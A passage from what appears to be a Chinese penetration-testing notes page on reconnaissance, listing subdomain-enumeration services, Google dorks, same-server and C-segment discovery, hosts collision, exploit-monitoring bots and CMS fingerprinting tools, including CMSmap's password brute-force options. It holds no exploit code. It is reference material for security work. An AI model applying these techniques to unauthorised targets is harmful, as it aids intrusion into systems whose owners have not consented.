class="line">//输出文件名。 默认为 &#123;target&#125;.txt</span><br><span class="line">python3 subDomainsBrute.py baidu.com --full -i -t 30 -o baidu.txt</span><br><span class="line"></span><br><span class="line">//结果将输出到 &quot;tmp/(域名_时间)/baidu.txt&quot; 文件内</span><br></pre></td></tr></table></figure><h3 id="网站查询搜索引擎查询"><a class="markdownIt-Anchor" href="#网站查询搜索引擎查询">#</a> 网站查询 &amp; 搜索引擎查询</h3><h4 id="网站查询"><a class="markdownIt-Anchor" href="#网站查询">#</a> 网站查询</h4><p>DNSDB：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkYi5pby96aC1jbi8=">https://dnsdb.io/zh-cn/</span></p><p>在线子域名查询：<span class="exturl" data-url="aHR0cHM6Ly9waHBpbmZvLm1lL2RvbWFpbi8=">https://phpinfo.me/domain/</span></p><p>ip 或域名查询：<span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=">https://site.ip138.com/</span></p><p>子域名扫描：<span class="exturl" data-url="aHR0cHM6Ly93d3cudDFoMnVhLmNuL3Rvb2xzLw==">https://www.t1h2ua.cn/tools/</span></p><p>Aleax 网站：<span class="exturl" data-url="aHR0cHM6Ly9hbGV4YS5jaGluYXouY29tLw==">https://alexa.chinaz.com/</span></p><p>securitytrails：<span class="exturl" data-url="aHR0cHM6Ly9zZWN1cml0eXRyYWlscy5jb20vbGlzdC9hcGV4X2RvbWFpbi93d3cuYmFpZHUuY29t">https://securitytrails.com/list/apex_domain/www.baidu.com</span></p><p>dns 侦测：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v">https://dnsdumpster.com/</span></p><h4 id="搜索引擎查询"><a class="markdownIt-Anchor" href="#搜索引擎查询">#</a> 搜索引擎查询</h4><p>原理：通过搜索引擎获取已经爬取的子域名；</p><p>语法：site:360.cn</p><p>使用 &quot;-&quot; 减号来去除已知子域名：site:target.com-www-blog</p><p>相关工具：</p><ul><li><ul><li>theHarvester</li></ul></li></ul><h4 id="theharvesterkali自带"><a class="markdownIt-Anchor" href="#theharvesterkali自带">#</a> theHarvester（kali 自带）</h4><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627353647646-26b947a2-2f09-4615-831c-d01cfe6e0757.png" alt="img"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">-d：搜索的域或公司名称</span><br><span class="line">-b：数据来源（google、bing、bingapi、pgp、linkedin、google-profiles、baidu、jigsaw、all）</span><br><span class="line">-s：结果编号从X开始（默认为0）</span><br><span class="line">-v：通过dns解析验证主机名，并搜索虚拟主机</span><br><span class="line">-f：将结果保存到HTML和XML文件中</span><br><span class="line">-n：对所有发现的地址范围进行DNS反向查询</span><br><span class="line">-c：对域名执行DNS强力解析</span><br><span class="line">-t：执行DNS TLD扩展发现</span><br><span class="line">-e：指定DNS服务器</span><br><span class="line">-l：限制结果数量（pgp不使用此选项）</span><br><span class="line">-h：使用SHODAN数据库查询已发现的主机</span><br><span class="line">//例子：</span><br><span class="line">theHarvester -d microsoft.com -l 500 -b google</span><br><span class="line">theHarvester -d microsoft.com -b all</span><br><span class="line">theHarvester -d microsoft -l 200 -b linkedin</span><br></pre></td></tr></table></figure><h3 id="空间引擎"><a class="markdownIt-Anchor" href="#空间引擎">#</a> 空间引擎</h3><p>Fofa：domain=“<span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span>”</p><p>Zoomeye：site:baidu.com</p><p>Shodan：hostname:“<span class="exturl" data-url="aHR0cDovL2JhaWR1LmNvbQ==">baidu.com</span>”</p><h3 id="https证书透明度"><a class="markdownIt-Anchor" href="#https证书透明度">#</a> HTTPS 证书透明度</h3><p>谷歌 Chrome 要求 2017 年所有 SSL 证书都要支持证书透明，所以可以根据 CT log 查询支持 HTTPS 网站的子域名；</p><ul><li><p>crtsh：<span class="exturl" data-url="aHR0cHM6Ly9jcnQuc2gv">https://crt.sh/</span></p></li><li><p>facebook：<span class="exturl" data-url="aHR0cHM6Ly9kZXZlbG9wZXJzLmZhY2Vib29rLmNvbS90b29scy9jdA==">https://developers.facebook.com/tools/ct</span></p></li><li><p>entrust：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZW50cnVzdC5jb20vY3Qtc2VhcmNoLw==">https://www.entrust.com/ct-search/</span></p></li><li><p>certspotter：<span class="exturl" data-url="aHR0cHM6Ly9zc2xtYXRlLmNvbS9jZXJ0c3BvdHRlci9hcGkv">https://sslmate.com/certspotter/api/</span></p></li><li><p>spyse：<span class="exturl" data-url="aHR0cHM6Ly9zcHlzZS5jb20vc2VhcmNoL2NlcnRpZmljYXRl">https://spyse.com/search/certificate</span></p></li><li><p>censys：<span class="exturl" data-url="aHR0cHM6Ly9jZW5zeXMuaW8vY2VydGlmaWNhdGVz">https://censys.io/certificates</span></p></li><li><p>google： <span class="exturl" data-url="aHR0cHM6Ly9nb29nbGUuY29tL3RyYW5zcGFyZW5jeXJlcG9ydC9odHRwcy9jdC8=">https://google.com/transparencyreport/https/ct/</span></p></li></ul><h3 id="用dns数据集收集子域"><a class="markdownIt-Anchor" href="#用dns数据集收集子域">#</a> 用 DNS 数据集收集子域</h3><p>原理：利用 DNS 记录公开数据收集 ；</p><p>注：将需要 {domain} 换成需要查询的域名，标红的是我认为效果较好；</p><ul><li><ul><li>ip138：<span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8lN0Jkb21haW4lN0QvZG9tYWluLmh0bQ==">https://site.ip138.com/{domain}/domain.htm</span></li><li domain="">百度云观测：<span class="exturl" data-url="aHR0cDovL2NlLmJhaWR1LmNvbS9pbmRleC9nZXRSZWxhdGVkU2l0ZXM/c2l0ZV9hZGRyZXNzPQ==">http://ce.baidu.com/index/getRelatedSites?site_address=</span></li></ul></li><li><ul><li>hackertarget：<span class="exturl" data-url="aHR0cHM6Ly9oYWNrZXJ0YXJnZXQuY29tL2ZpbmQtZG5zLWhvc3QtcmVjb3Jkcy8=">https://hackertarget.com/find-dns-host-records/</span></li><li domain="">riddler：<span class="exturl" data-url="aHR0cHM6Ly9yaWRkbGVyLmlvL3NlYXJjaD9xPXBsZDo=">https://riddler.io/search?q=pld:</span></li></ul></li><li><ul><li domain="">dnsdb：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkYi5pby96aC1jbi9zZWFyY2g/cT0=">https://dnsdb.io/zh-cn/search?q=</span></li><li>ipv4info：<span class="exturl" data-url="aHR0cDovL2lwdjRpbmZvLmNvbS8=">http://ipv4info.com/</span></li></ul></li><li><ul><li>robtex：<span class="exturl" data-url="aHR0cHM6Ly93d3cucm9idGV4LmNvbS9kbnMtbG9va3VwLw==">https://www.robtex.com/dns-lookup/</span></li><li>chinaz：<span class="exturl" data-url="aHR0cHM6Ly9hbGV4YS5jaGluYXouY29tLw==">https://alexa.chinaz.com/</span></li></ul></li><li><ul><li>netcraft：<span class="exturl" data-url="aHR0cHM6Ly9zZWFyY2hkbnMubmV0Y3JhZnQuY29tLw==">https://searchdns.netcraft.com/</span></li><li>dnsdumpster：<span class="exturl" data-url="aHR0cHM6Ly9kbnNkdW1wc3Rlci5jb20v">https://dnsdumpster.com/</span></li></ul></li><li><ul><li>sitedossier：<span class="exturl" data-url="aHR0cDovL3d3dy5zaXRlZG9zc2llci5jb20v">http://www.sitedossier.com/</span></li><li>findsubdomains：<span class="exturl" data-url="aHR0cHM6Ly9maW5kc3ViZG9tYWlucy5jb20v">https://findsubdomains.com/</span></li></ul></li></ul><h3 id="利用威胁情报平台数据收集子域"><a class="markdownIt-Anchor" href="#利用威胁情报平台数据收集子域">#</a> 利用威胁情报平台数据收集子域</h3><p>都是需要注册的，注册免费查询；</p><ul><li><ul><li>AlienVault：<span class="exturl" data-url="aHR0cHM6Ly9vdHguYWxpZW52YXVsdC5jb20v">https://otx.alienvault.com/</span></li></ul></li><li><ul><li>RiskIQ 社区版：<span class="exturl" data-url="aHR0cHM6Ly9jb21tdW5pdHkucmlza2lxLmNvbS8=">https://community.riskiq.com/</span></li></ul></li><li><ul><li>微步在线：<span class="exturl" data-url="aHR0cHM6Ly94LnRocmVhdGJvb2suY24v">https://x.threatbook.cn/</span></li></ul></li><li><ul><li domain=""><span class="exturl" data-url="aHR0cDovL1RocmVhdE1pbmVyLm9yZw==">ThreatMiner.org</span>：<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhyZWF0bWluZXIub3JnL2RvbWFpbi5waHA/cT0=">https://www.threatminer.org/domain.php?q=</span></li></ul></li><li><ul><li>VT：<span class="exturl" data-url="aHR0cHM6Ly93d3cudmlydXN0b3RhbC5jb20vZ3VpL2RvbWFpbi8lN0Jkb21haW4lN0QvcmVsYXRpb25z">https://www.virustotal.com/gui/domain/{domain}/relations</span></li></ul></li><li><ul><li><span class="exturl" data-url="aHR0cDovL1BlbnRlc3QtVG9vbHMuY29t">Pentest-Tools.com</span>：<span class="exturl" data-url="aHR0cHM6Ly9wZW50ZXN0LXRvb2xzLmNvbS9pbmZvcm1hdGlvbi1nYXRoZXJpbmcvZmluZC1zdWJkb21haW5zLW9mLWRvbWFpbiM=">https://pentest-tools.com/information-gathering/find-subdomains-of-domain#</span></li></ul></li></ul><h3 id="隐藏域名hosts碰撞"><a class="markdownIt-Anchor" href="#隐藏域名hosts碰撞">#</a> 隐藏域名 hosts 碰撞</h3><p>隐藏资产探测 - hosts 碰撞</p><p>很多时候访问目标资产 IP 响应多为：401、403、404、500，但是用域名请求却能返回正常的业务系统（禁止 IP 直接访问），因为这大多数都是需要绑定 host 才能正常请求访问的（目前互联网公司基本的做法）（域名删除了 A 记录，但是反代的配置未更新），那么我们就可以通过收集到的目标的域名和目标资产的 IP 段组合起来，以 IP 段 + 域名的形式进行捆绑碰撞，就能发现很多有意思的东西；</p><p>脚本工具</p><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2ZvZmFwcm8vSG9zdHNfc2Nhbg==">https://github.com/fofapro/Hosts_scan</span></p><p>原理：在发送 http 请求的时候，对域名和 IP 列表进行配对，然后遍历发送请求 （就相当于修改了本地的 hosts 文件一样），并把相应的 title 和响应包大小拿回 来做对比，即可快速发现一些隐蔽的资产；</p><p>使用：</p><p>进行 hosts 碰撞需要目标的域名和目标的相关 IP 作为字典；</p><p>相关 IP 来源有：</p><ol><li><ol><li>目标域名历史解析 IP<br><span class="exturl" data-url="aHR0cHM6Ly9zaXRlLmlwMTM4LmNvbS8=">https://site.ip138.com/</span><br><span class="exturl" data-url="aHR0cHM6Ly9pcGNoYXh1bi5jb20v">https://ipchaxun.com/</span></li><li>页面 /js 源码爬取 IP<br>oneforall 貌似实现了<br>长亭的 rad 以 burp 为代理爬，保存返回包，再正则提取出 IP</li></ol></li></ol><p>具体可以参考：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3MvZnVBU1pPRHcxckx2Z1Q3R3lTTUM4UQ==">https://mp.weixin.qq.com/s/fuASZODw1rLvgT7GySMC8Q</span></p><h2 id="旁注c端"><a class="markdownIt-Anchor" href="#旁注c端">#</a> 旁注 / C 端</h2><h3 id="旁注"><a class="markdownIt-Anchor" href="#旁注">#</a> 旁注</h3><p>旁注攻击就是说在攻击目标时，对目标网站 “无法下手” 找不到目标网站的漏洞，那么攻击者就可以通过在与目标站点同一服务器下的站点渗透，从而获取目标站点的权限，这过程就是旁注攻击；</p><p>IP 逆向查询：</p><ul><li><ul><li>yougetsignal：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91Z2V0c2lnbmFsLmNvbS90b29scy93ZWItc2l0ZXMtb24td2ViLXNlcnZlci8=">https://www.yougetsignal.com/tools/web-sites-on-web-server/</span></li><li>站长工具：<span class="exturl" data-url="aHR0cDovL3MudG9vbC5jaGluYXouY29tL3NhbWUv">http://s.tool.chinaz.com/same/</span></li></ul></li><li><ul><li>爱站：<span class="exturl" data-url="aHR0cHM6Ly9kbnMuYWl6aGFuLmNvbS8=">https://dns.aizhan.com/</span></li><li>同 ip 网站查询：<span class="exturl" data-url="aHR0cDovL2Rucy5idWdzY2FuZXIuY29tLw==">http://dns.bugscaner.com/</span></li></ul></li><li><ul><li>webscan：<span class="exturl" data-url="aHR0cHM6Ly93d3cud2Vic2Nhbi5jYy8=">https://www.webscan.cc/</span></li></ul></li></ul><h3 id="c端"><a class="markdownIt-Anchor" href="#c端">#</a> C 端</h3><p>C 段指的是同一内网段内的其他服务器，每个 IP 有 ABCD 四个段，举个例子，192.168.0.1，A 段就是 192，B 段是 168，C 段是 0，D 段是 1，而 C 段嗅探的意思就是拿下它同一 C 段中的其中一台服务器，也就是说是 D 段 1-255 中的一台服务器，然后利用工具嗅探拿下该服务器；</p><p>查询 C 段的方法很多，一下举例几种常见的：</p><ul><li><ul><li>在线 webscan：<span class="exturl" data-url="aHR0cHM6Ly93ZWJzY2FuLmNjLw==">https://webscan.cc/</span></li><li>fofa、shodan 在线工具：ip=“106.15.141.18/24”</li></ul></li><li><ul><li>nmap：nmap 192.168.1.0/24 -p 443,80</li><li>masscan：masscan 10.11.0.0/16 -p 443,80</li></ul></li><li><ul><li>goby</li><li>御剑 1.5</li></ul></li></ul><h3 id="旁注查询小脚本"><a class="markdownIt-Anchor" href="#旁注查询小脚本">#</a> 旁注查询小脚本</h3><p><span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2F0dGFjaG1lbnRzL3l1cXVlLzAvMjAyMi9weS8yNjk5NzUwLzE2NDM2MDY1NjU3NzUtYTE0OTA4OGMtNGZiNC00ZjYxLWEwMmQtNTM2N2UxMzc4MzY1LnB5">📎旁站查询.py</span></p><h2 id="ip反查域名"><a class="markdownIt-Anchor" href="#ip反查域名">#</a> IP 反查域名</h2><p>原理：通过 ip 反查该 ip 绑定过的域名；</p><ul><li><ul><li>ip-adress：<span class="exturl" data-url="aHR0cHM6Ly93d3cuaXAtYWRyZXNzLmNvbS9yZXZlcnNlLWlwLWxvb2t1cA==">https://www.ip-adress.com/reverse-ip-lookup</span></li><li>去查网：<span class="exturl" data-url="aHR0cDovL3d3dy43Yy5jb20v">http://www.7c.com/</span></li></ul></li><li><ul><li>IPIP：<span class="exturl" data-url="aHR0cHM6Ly90b29scy5pcGlwLm5ldC9pcGRvbWFpbi5waHA=">https://tools.ipip.net/ipdomain.php</span></li><li>Dynu：<span class="exturl" data-url="aHR0cHM6Ly93d3cuZHludS5jb20vemgtQ04vTmV0d29ya1Rvb2xzL1JldmVyc2VMb29rdXA=">https://www.dynu.com/zh-CN/NetworkTools/ReverseLookup</span></li></ul></li><li><ul><li>yougetsignal：<span class="exturl" data-url="aHR0cHM6Ly93d3cueW91Z2V0c2lnbmFsLmNvbS90b29scy93ZWItc2l0ZXMtb24td2ViLXNlcnZlci8=">https://www.yougetsignal.com/tools/web-sites-on-web-server/</span></li></ul></li></ul><h2 id="查找厂商ip端"><a class="markdownIt-Anchor" href="#查找厂商ip端">#</a> 查找厂商 ip 端</h2><p><span class="exturl" data-url="aHR0cDovL2lwd2hvaXMuY25uaWMubmV0LmNuL2luZGV4LmpzcA==">http://ipwhois.cnnic.net.cn/index.jsp</span></p><h1 id="源码cms"><a class="markdownIt-Anchor" href="#源码cms">#</a> 源码 CMS</h1><h2 id="github监控"><a class="markdownIt-Anchor" href="#github监控">#</a> github 监控</h2><h3 id="exp监控"><a class="markdownIt-Anchor" href="#exp监控">#</a> exp 监控</h3><p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3loeTAvZ2l0aHViLWN2ZS1tb25pdG9y">https://github.com/yhy0/github-cve-monitor</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627370900489-a48b20f1-21eb-4e28-8f97-d1675c607d99.png" alt="img"></p><p>工具地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0p1c3RZb29tb29uL0NWRUFQ">https://github.com/JustYoomoon/CVEAP</span></p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627377395097-efea1345-bb6e-4231-bdca-720b9221731f.png" alt="img"></p><h4 id="钉钉机器人举例"><a class="markdownIt-Anchor" href="#钉钉机器人举例">#</a> 钉钉机器人举例</h4><p>步骤一：在海外云主机上运行一下命令拉取项目文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/JustYoomoon/CVEAP.git</span><br></pre></td></tr></table></figure><p>步骤二：进入项目文件进行配置（钉钉）</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">##########修改处1########</span><br><span class="line"># 钉钉</span><br><span class="line">def dingding(text, msg):</span><br><span class="line">    # 将此处换为钉钉机器人的api</span><br><span class="line">    webhook = &#x27;xxxxxxxxxxxxxxxxxxxx&#x27;</span><br><span class="line">    ding = cb.DingtalkChatbot(webhook, secret=&quot;xxxxxxxxxxx&quot;)</span><br><span class="line">    ding.send_text(msg=&#x27;&#123;&#125;\r\n&#123;&#125;&#x27;.format(text, msg), is_at_all=False)</span><br><span class="line">##########修改处2######## </span><br><span class="line"> # 三选一即可，没配置的 注释或者删掉</span><br><span class="line"> # server(text, msg)</span><br><span class="line"> dingding(text, msg)</span><br><span class="line"> # tgbot(text,msg)</span><br><span class="line"> # print(msg)</span><br><span class="line"> # mail(text, msg)  </span><br></pre></td></tr></table></figure><p>步骤三：在钉钉中新建群并开启群机器人，将一下信息复制并填写到上面要修改的信息</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2699750/1626826802670-84d1b326-3ebe-4d70-b04a-2dde4364a90d.png" alt="img"></p><p>步骤四：在服务器上安装上要安装的第三方库 <code>requests....</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">screen -S CVEAP </span><br><span class="line">python3 cveap.py</span><br><span class="line">ctrl+a ctrl+d</span><br></pre></td></tr></table></figure><p>步骤五：效果</p><p>运行脚本过一会才会收到推送</p><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627377779829-9c19feb2-1de8-40a5-9679-052c9c8b09dd.png" alt="img"></p><h2 id="引擎搜索"><a class="markdownIt-Anchor" href="#引擎搜索">#</a> 引擎搜索</h2><h3 id="白引擎"><a class="markdownIt-Anchor" href="#白引擎">#</a> 白引擎</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">百度：www.baidu.com</span><br><span class="line">bing：www.bing.com</span><br><span class="line">Yahoo：www.search.yahoo.com</span><br><span class="line">aol：www.search.aol.com</span><br><span class="line">google：google.cn</span><br></pre></td></tr></table></figure><h4 id="google-hack语法"><a class="markdownIt-Anchor" href="#google-hack语法">#</a> google hack 语法</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">intitle: 标题关键字</span><br><span class="line">inurl: URL关键特征</span><br><span class="line">intext: 内容关键词</span><br><span class="line">filetype: 指定类型文件  //例如：bak , mdb , asp , php , jsp</span><br><span class="line">site: 指定域名</span><br><span class="line">link: baidu.com  //表示返回所有和baidu.com做了链接的网站</span><br><span class="line">info: 查找指定站点的一些基本信息</span><br><span class="line">cache: 搜索google里关于某些内容的缓存</span><br><span class="line"></span><br><span class="line">举例：</span><br><span class="line">intext:管理</span><br><span class="line">    filetype:mdb</span><br><span class="line">    inurl:file</span><br><span class="line">    site:http://xx.com filetype:txt</span><br><span class="line">    site:http://xx.com filetype:asp</span><br><span class="line">    site:tw inurl:asp?id=    //查找台湾的</span><br><span class="line">    intitle:旁注- 网站 filetype:asp</span><br></pre></td></tr></table></figure><h3 id="黑暗引擎"><a class="markdownIt-Anchor" href="#黑暗引擎">#</a> 黑暗引擎</h3><p>引擎使用参考：<span class="exturl" data-url="aHR0cHM6Ly93d3cueXVxdWUuY29tL2RvY3Mvc2hhcmUvYzk5NzQ5ZjctMWMxZC00YWVlLWE0ZTMtYTVmMTllMTlmMmYxPyMlRUYlQkMlODglRTUlQUYlODYlRTclQTAlODElRUYlQkMlOUFpb2g4JUVGJUJDJTg5">https://www.yuque.com/docs/share/c99749f7-1c1d-4aee-a4e3-a5f19e19f2f1?#（密码：ioh8）</span> 《黑白引擎使用》</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">www.shodan.io</span><br><span class="line"></span><br><span class="line">fofa.so</span><br><span class="line"></span><br><span class="line">www.zoomeye.org</span><br><span class="line"></span><br><span class="line">https://quake.360.cn/quake/#/index</span><br></pre></td></tr></table></figure><h2 id="cms识别"><a class="markdownIt-Anchor" href="#cms识别">#</a> CMS 识别</h2><p>1.CMS [内容管理系统]：快速搭建网站的模板；</p><p>2.Web 应用框架：快速开放的 Web 应用框架，例如网站、小程序；</p><p>3. 指纹的特性：</p><p>1. 唯一性</p><p>2. 终身不变性</p><p>3. 方便性</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">常见的CMS有：</span><br><span class="line">WordPress、</span><br><span class="line">    Dedecms、</span><br><span class="line">    Discuz、</span><br><span class="line">    PhpWeb、</span><br><span class="line">    PhpWind、</span><br><span class="line">    Dvbbs、</span><br><span class="line">    PhpCMS、</span><br><span class="line">    ECShop、</span><br><span class="line">    SiteWeaver、</span><br><span class="line">    AspCMS、</span><br><span class="line">    帝国、</span><br><span class="line">    Z-Blog、</span><br><span class="line">    等</span><br></pre></td></tr></table></figure><h3 id="开源cms在线识别"><a class="markdownIt-Anchor" href="#开源cms在线识别">#</a> 开源 CMS 在线识别</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">国外识别平台：https://whatcms.org/</span><br><span class="line"></span><br><span class="line">国内识别平台：</span><br><span class="line">bugscaner：http://whatweb.bugscaner.com/</span><br><span class="line"></span><br><span class="line">whatweb：https://www.whatweb.net/</span><br><span class="line">    </span><br><span class="line">    云悉：https://www.yunsee.cn/</span><br><span class="line">    </span><br><span class="line">    潮汐：http://finger.tidesec.net/</span><br><span class="line">    </span><br><span class="line">    TSscan:https://scan.dyboy.cn/web/</span><br><span class="line">    </span><br><span class="line">github直接找：</span><br><span class="line">https://github.com/search?q=cms识别</span><br></pre></td></tr></table></figure><h3 id="cms识别工具"><a class="markdownIt-Anchor" href="#cms识别工具">#</a> CMS 识别工具</h3><h4 id="cmsmap"><a class="markdownIt-Anchor" href="#cmsmap">#</a> CMSmap</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Rpb25hY2gvQ01TbWFw">https://github.com/dionach/CMSmap</span></p><p><strong>安装</strong></p><p>github 克隆下来：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Dionach/CMSmap</span><br></pre></td></tr></table></figure><p>使用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">参数：</span><br><span class="line">-f W/J/D, --force W/J/D</span><br><span class="line">  强制扫描 (W)ordpress、(J)oomla 或 (D)rupal</span><br><span class="line">  -F, --fullscan 使用大型插件列表进行全面扫描。误报和缓慢！</span><br><span class="line">  -t , --threads 线程数（默认 5）</span><br><span class="line">  -a , --agent 设置自定义用户代理</span><br><span class="line">  -H , --header 添加自定义标题（例如“授权：基本 ABCD...”）</span><br><span class="line">  -i , --input 扫描给定文件中列出的多个目标</span><br><span class="line">  -o , --output 将输出保存在文件中</span><br><span class="line">  -E, --noedb 枚举插件而不搜索漏洞</span><br><span class="line">  -c, --nocleanurls 仅对 Drupal 禁用干净的 url</span><br><span class="line">  -s, --nosslcheck 不验证服务器的证书</span><br><span class="line">  -d, --dictattack 在扫描期间运行低强度字典攻击（每个用户 5 次尝试）</span><br><span class="line">  -u , --usr 用户名或用户名文件</span><br><span class="line">  -p , --psw 密码或密码文件</span><br><span class="line">  -x, --noxmlrpc 在没有 XML-RPC 的情况下暴力破解 WordPress</span><br><span class="line">  </span><br><span class="line">使用实例：</span><br><span class="line">cmsmap.py https://example.com</span><br><span class="line">  cmsmap.py https://example.com -f W -F --noedb -d </span><br><span class="line">  cmsmap.py https://example.com -i targets.txt -o output.txt</span><br><span class="line">  cmsmap.py https://example.com -u admin -p passwords.txt</span><br></pre></td></tr></table></figure><h4 id="ehole"><a class="markdownIt-Anchor" href="#ehole">#</a> EHole</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0VkZ2VTZWN1cml0eVRlYW0vRUhvbGU=">https://github.com/EdgeSecurityTeam/EHole</span></p><p><strong>安装</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">哪个系统用就下载哪个</span><br></pre></td></tr></table></figure><p><strong>使用</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  参数：</span><br><span class="line">  -f 字符串</span><br><span class="line">        fofa搜索的资产，支持IP和IP段。（192.168.1.1 | 192.168.1.0/24）</span><br><span class="line">  -ftime 字符串</span><br><span class="line">        fofa 超时（默认“ 10 ”）</span><br><span class="line">  -h 这个帮助</span><br><span class="line">  -json 字符串</span><br><span class="line">        输出json</span><br><span class="line">  -l 字符串</span><br><span class="line">        基于本地文件的探测</span><br><span class="line">  -日志字符串</span><br><span class="line">        日志文件名（默认“ server.log ”）</span><br><span class="line">  -t 字符串</span><br><span class="line">        线程（默认“ 100 ”）</span><br><span class="line">        </span><br><span class="line">使用：</span><br><span class="line">本地识别：EHole -l url.txt //URL地址需带上协议，每行一个</span><br><span class="line">  FOFA识别：EHole -f 192.168.1.1/24 //支持单IP或IP段</span><br><span class="line">注意：从 FOFA 识别需要配置 FOFA 密码以及邮箱，在 config.ini 内配置好密码以及邮箱使用。</span><br><span class="line">  结果输出：EHole -l url.txt -json export.json //结果输出至export.json文件</span><br></pre></td></tr></table></figure><p><img data-src="https://cdn.nlark.com/yuque/0/2021/png/2336202/1627438927073-c19f47a6-8895-45aa-bc2b-31ae76202602.png" alt="img"></p><h4 id="cmseek"><a class="markdownIt-Anchor" href="#cmseek">#</a> CMSeeK</h4><p>地址：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1R1aGluc2h1YmhyYS9DTVNlZUs=">https://github.com/Tuhinshubhra/CMSeeK</span></p><p>安装</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/Tuhinshubhra/CMSeeK.git</span><br><span class="line"></span><br><span class="line">pip3 install -r 